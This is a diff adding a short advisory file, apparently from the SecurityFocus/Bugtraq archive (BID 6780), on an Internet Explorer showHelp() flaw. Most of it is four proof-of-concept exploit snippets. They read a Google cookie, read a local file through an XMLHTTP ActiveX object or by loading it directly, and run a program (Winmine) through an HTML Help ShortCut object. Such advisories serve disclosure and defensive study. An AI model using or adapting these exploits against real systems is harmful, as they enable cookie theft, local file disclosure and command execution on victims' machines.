@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/6780/info
+
+Microsoft Internet Explorer implements the showHelp() function as a means of displaying help content contained in HTML pages. However, this function is capable of performing too many other actions outside of its intended functionality through pluggable protocols. These actions could include reading files and executing commands on the vulnerable system.
+
+Exploit 1:
+
+// Sandblad advisory #11 - Read your google cookie
+showHelp("file:");showHelp("http://www.google.com/");
+showHelp("javascript:alert(document.cookie)");
+
+Exploit 2:
+
+// Sandblad advisory #11 - Read the file c:\test.txt
+showHelp("file:");showHelp("res://shdoclc.dll/about.dlg");
+showHelp("javascript:try{c=new ActiveXObject('Msxml2.XMLHTTP')}catch(e){c=new ActiveXObject('Microsoft.XMLHTTP')};c.open('GET','file://c:/test.txt',false);c.send(null);alert(c.responseText)");
+
+Exploit 3:
+
+// Sandblad advisory #11 - Read the file c:\test.txt
+showHelp("file:");showHelp("file://c:/test.txt");
+showHelp("javascript:alert(document.body.innerText)");
+
+Exploit 4:
+
+// Sandblad advisory #11 - Run the very nice game Winmine
+showHelp("file:");showHelp("iexplore.chm");showHelp("res:");
+showHelp("javascript:location='mk:@MSITStore:C:'");
+showHelp("javascript:document.write('<object id=c classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\\u003E<param name=Command value=ShortCut\\u003E\<param name=Item1 value=,winmine,\\u003E</object\\u003E');c.Click();");
